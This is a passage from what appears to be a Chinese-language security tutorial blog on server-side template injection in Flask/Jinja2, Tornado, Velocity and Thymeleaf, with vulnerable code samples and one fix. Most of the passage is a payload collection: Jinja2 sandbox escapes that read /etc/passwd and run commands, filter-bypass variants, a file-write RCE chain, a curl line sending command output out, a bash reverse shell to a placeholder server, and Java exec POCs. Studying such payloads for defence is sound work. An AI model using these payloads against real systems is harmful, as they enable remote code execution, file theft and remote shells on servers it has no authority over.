class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">     &#123;% for comment in comments %&#125;</span><br><span class=\"line\">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt;</span><br><span class=\"line\">     &#123;% endfor %&#125;</span><br><span class=\"line\">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n<p>模板的不安全使用：示例 1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request</span><br><span class=\"line\">from jinja2 import Template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&quot;/&quot;)</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Template(&quot;Hello &quot; + name)</span><br><span class=\"line\">    return t.render()</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<p>t = Template (“hello” + name) 这行代码表示，将前端输入的 name 拼接到模板，此时 name 的输入没有经过任何检测，尝试使用模板语言测试：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200903130738597-1463882629.png\" alt=\"img\"></p>\n<p>如果使用一个固定好了的模板，在模板渲染之后传入数据，就不存在模板注入，就好像 SQL 注入的预编译一样，修复上面代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request</span><br><span class=\"line\">from jinja2 import Template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&quot;/&quot;)</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span><br><span class=\"line\">    return t.render(n=name)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<p>模板的不安全使用：示例 2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask</span><br><span class=\"line\">from flask import render_template</span><br><span class=\"line\">from flask import request</span><br><span class=\"line\">from flask import render_template_string</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def test():</span><br><span class=\"line\">    template = &#x27;&#x27;&#x27;</span><br><span class=\"line\">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class=\"line\">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class=\"line\">            &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class=\"line\">        &lt;/div&gt; </span><br><span class=\"line\">    &#x27;&#x27;&#x27; %(request.url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return render_template_string(template)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    app.debug = True</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<p>正常代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br><span class=\"line\">@app.route(&#x27;/index&#x27;)#我们访问/或者/index都会跳转</span><br><span class=\"line\">def index():</span><br><span class=\"line\">   return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,user=request.args.get(&quot;key&quot;))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发现`&#123;&#123; --- &#125;&#125;`其中的语句被执行了</span><br><span class=\"line\"></span><br><span class=\"line\">- 这是因为在flask中，渲染引擎Jinja2会将`&#123;&#123; --- &#125;&#125;`视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行</span><br><span class=\"line\">- 那么，在上一段代码中，如果我们传入的参数内容为`&#123;&#123; --- &#125;&#125;`包裹的代码，这些代码就会被执行</span><br><span class=\"line\"></span><br><span class=\"line\">两种代码的形式是，一种当字符串来渲染并且使用了`%(request.url)`，另一种规范使用index.html渲染文件。我们漏洞代码使用了`render_template_string`函数，而如果我们使用`render_template`函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码`&#123;&#123;&#125;&#125;`你将会发现如下：</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203104033489.png\" alt=\"image-20221203104033489\"></p>\n<p>在上述例子中，虽然已经可以实现任意代码执行，但由于模板本身的沙盒安全机制，某些语句虽然可以执行，却不会执行成功</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/38cb12c26e49b5678b9c682fc2f9548c.png\" alt=\"img\"></p>\n<p>即使在服务器端将 os 包含进来，但是在渲染时仍然会出现这个错误，这就是因为沙盒机制严格地限制了程序的行为</p>\n<p>沙箱逃逸的过程简单讲如下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/eb3b14325cb6de4c69ef852c3affd370.png\" alt=\"img\"></p>\n<p>由于在 jinja2 中是可以直接访问 python 的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class=\"line\">__class__　　：返回一个实例所属的类</span><br><span class=\"line\">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class=\"line\">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class=\"line\">// __base__和__mro__都是用来寻找基类的</span><br><span class=\"line\">__subclasses__　　：以列表返回类的子类</span><br><span class=\"line\">__init__　　 ：类的初始化方法</span><br><span class=\"line\">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>\n<p>jinja2 使用 file 读取文件</p>\n<p><strong>python3 已经移除了 file。所以利用 file 子类文件读取只能在 python2 中用。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% if c.__name__==&#x27;file&#x27; %&#125;</span><br><span class=\"line\">&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>jinja2 命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># python2</span><br><span class=\"line\">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class=\"line\">().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class=\"line\">().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class=\"line\">().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#python3</span><br><span class=\"line\">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class=\"line\">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获得基类</span><br><span class=\"line\">#python2.7</span><br><span class=\"line\">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class=\"line\">&#123;&#125;.__class__.__bases__[0]</span><br><span class=\"line\">().__class__.__bases__[0]</span><br><span class=\"line\">[].__class__.__bases__[0]</span><br><span class=\"line\">request.__class__.__mro__[1]</span><br><span class=\"line\">#python3.7</span><br><span class=\"line\">&#x27;&#x27;.__。。。class__.__mro__[1]</span><br><span class=\"line\">&#123;&#125;.__class__.__bases__[0]</span><br><span class=\"line\">().__class__.__bases__[0]</span><br><span class=\"line\">[].__class__.__bases__[0]</span><br><span class=\"line\">request.__class__.__mro__[1]</span><br><span class=\"line\"></span><br><span class=\"line\">#python 2.7</span><br><span class=\"line\">#文件操作</span><br><span class=\"line\">#找到file类</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class=\"line\">#读文件</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class=\"line\">#写文件</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#命令执行</span><br><span class=\"line\">#os执行</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class=\"line\">#eval,impoer等全局函数</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class=\"line\">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class=\"line\"></span><br><span class=\"line\">#python3.7</span><br><span class=\"line\">#命令执行</span><br><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\">#文件操作</span><br><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\">#windows下的os命令</span><br><span class=\"line\">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>\n<p><strong>过滤 [</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#getitem、pop</span><br><span class=\"line\">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()</span><br><span class=\"line\">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>\n<p><strong>过滤引号</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#chr函数</span><br><span class=\"line\">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class=\"line\">#命令执行</span><br><span class=\"line\">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>\n<p><strong>过滤下划线</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>\n<p><strong>过滤 join</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br></pre></td></tr></table></figure>\n<p><strong>过滤花括号</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#用&#123;%%&#125;标记</span><br><span class=\"line\">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>RCE</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>\n<p><strong>利用示例：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class=\"line\">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class=\"line\">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class=\"line\">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class=\"line\">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;         //popen的参数就是要执行的命令</span><br><span class=\"line\">    &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endfor %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY3OSN0b2MtMg==\">flask 之 ssti 模版注入从零到入门 - 先知社区 (aliyun.com)</span></p>\n<p>一些 SSTI 的利用方法</p>\n<p><strong>XSS</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/183818089cbcfaebaa8530e26755baa6.png\" alt=\"img\"></p>\n<p>以 GET 方式从 URL 处获取 code 参数的值，然后将它输出到页面 .</p>\n<p>这段代码非常容易看出来存在安全隐患。后端没有对用户输入的内容进行过滤，就直接将它输出到页面 输入端是完全可控的。这就产生了代码域与数据域的混淆</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/d365f73c989235a7b2e272a714c28433.png\" alt=\"img\"></p>\n<p><strong>反弹 shell</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1&#x27;).read()</span><br></pre></td></tr></table></figure>\n<p>这个 Payload 不能直接放在 URL 中执行，因为  <code>&amp;</code>  的存在会导致 URL 解析出现错误 可以使用 BurpSuite 等工具构造数据包再发送</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2a7321a2aee82c4f143e92ebf5bb70a9.png\" alt=\"img\"></p>\n<ul>\n<li>\n<p><code>request.environ</code>  一个与服务器环境相关的对象字典。访问该字典可以拿到很多你期待的信息</p>\n</li>\n<li>\n<p><code>config.items</code>  一个类字典的对象，包含了所有应用程序的配置值 在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY 等敏感值</p>\n</li>\n</ul>\n<h3 id=\"tornado\"><a class=\"markdownIt-Anchor\" href=\"#tornado\">#</a> tornado</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br></pre></td></tr></table></figure>\n<h2 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\">#</a> java</h2>\n<h3 id=\"velocity\"><a class=\"markdownIt-Anchor\" href=\"#velocity\">#</a> velocity</h3>\n<p>Apache Velocity 是一个基于 Java 的模板引擎，它提供了一个模板语言去引用由 Java 代码定义的对象。Velocity 是 Apache 基金会旗下的一个开源软件项目，旨在确保 Web 应用程序在表示层和业务逻辑层之间的隔离（即 MVC 设计模式）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 漏洞源码</span><br><span class=\"line\">private static void velocity(String template)&#123;</span><br><span class=\"line\">        Velocity.init();</span><br><span class=\"line\"></span><br><span class=\"line\">        VelocityContext context = new VelocityContext();</span><br><span class=\"line\"></span><br><span class=\"line\">        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class=\"line\">        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class=\"line\">        context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        StringWriter swOut = new StringWriter();</span><br><span class=\"line\">        // 使用Velocity</span><br><span class=\"line\">        Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>POC</strong><br>\n <code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzQ2NiN0b2MtMA==\">白头搔更短，SSTI 惹人心！ - 先知社区 (aliyun.com)</span></p>\n<h3 id=\"thymeleaf\"><a class=\"markdownIt-Anchor\" href=\"#thymeleaf\">#</a> Thymeleaf</h3>\n<p>Thymeleaf 是 SpringBoot 中的一个模版引擎，个人认为有点类似于 Python 中的 Jinja2，负责渲染前端页面。</p>\n<p>Thymeleaf 中的表达式有好几种</p>\n<ul>\n<li>变量表达式：  <code>$&#123;...&#125;</code></li>\n<li>选择变量表达式：  <code>*&#123;...&#125;</code></li>\n<li>消息表达：  <code>#&#123;...&#125;</code></li>\n<li>链接 URL 表达式：  <code>@&#123;...&#125;</code></li>\n<li>片段表达式：  <code>~&#123;...&#125;</code></li>\n</ul>\n<p>片段表达式语法：</p>\n<ol>\n<li><strong>~{templatename::selector}</strong>，会在 <code>/WEB-INF/templates/</code>  目录下寻找名为 <code>templatename</code>  的模版中定义的 <code>fragment</code> ，如上面的 <code>~&#123;footer :: copy&#125;</code></li>\n<li><strong>~{templatename}</strong>，引用整个 <code>templatename</code>  模版文件作为 <code>fragment</code></li>\n<li><strong>~{::selector} 或～{this::selector}</strong>，引用来自同一模版文件名为 <code>selector</code>  的 <code>fragmnt</code></li>\n</ol>\n<p>其中 <code>selector</code>  可以是通过 <code>th:fragment</code>  定义的片段，也可以是类选择器、ID 选择器等。</p>\n<p>当 <code>~&#123;&#125;</code>  片段表达式中出现 <code>::</code> ，则 <code>::</code>  后需要有值，也就是 <code>selector</code> 。</p>\n<p>预处理</p>\n<p>语法： <code>__$&#123;expression&#125;__</code></p>\n<p>官方文档对其的解释：</p>\n<blockquote>\n<p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有<em>预处理</em>表达式的功能。</p>\n<p><strong>预处理是在正常表达式之前完成的表达式的执行</strong>，允许修改最终将执行的表达式。</p>\n<p>预处理的表达式与普通表达式完全一样，但被双下划线符号（如 <code>__$&#123;expression&#125;__</code> ）包围。</p>\n</blockquote>\n<p>个人感觉这是出现 SSTI 最关键的一个地方，预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的 payload 即可达到任意代码执行</p>\n<p>最常见的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>\n<p>通过 <code>__$&#123;&#125;__::.x</code>  构造表达式会由 Thymeleaf 去执行</p>\n<p><span class=\"exturl\" 